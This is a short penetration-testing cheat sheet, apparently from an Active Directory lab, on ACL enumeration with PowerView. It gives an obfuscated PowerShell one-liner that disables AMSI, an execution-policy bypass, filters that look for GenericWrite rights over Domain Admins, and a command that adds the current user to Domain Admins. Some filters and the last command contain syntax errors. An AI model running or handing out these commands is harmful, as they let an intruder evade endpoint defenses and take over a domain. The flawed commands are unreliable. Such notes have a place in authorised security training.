# ACL Enumeration

## PowerView
Import PowerView to the compromised host and run the following commands


`powershell -ep bypass`

Bypass AMSI with this PowerShell command.


```powershell 
PS C:\AD> sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Import the script

`. .\powerview.ps1`

Who are you running as?

```powershell
PS C:\AD> whoami
MARVEL\student1
```

Get assoicated ACLs with your account

`PS C:\AD> Get-ObjectAcl -SamAccountName student1 -ResolveGUIDS`

`PS C:\AD> Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDS`

Match the Security ID with Domain Admins too clearify an exploitation path.

```powershell
PS C:\AD> Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDS | ? { ($_ActiveDirectoryRights -match 'GenericWrite') -and ($_securityIdentifier -match 'YOUR-OBJECTSID') }

PS C:\AD> Get-ObjectAcl -SamAccountName * -ResolveGUIDS | ? { ($_ActiveDirectoryRights -match 'GenericWrite') -and ($_securityIdentifier -match 'YOUR-OBJECTSID') }
```

If you found a generic write to group you can add yourself to that group:

```powershell
Add-DomainGroupMember -identity 'Domain Admins' -Member 'student1 -Domain 'MARVEL'
```
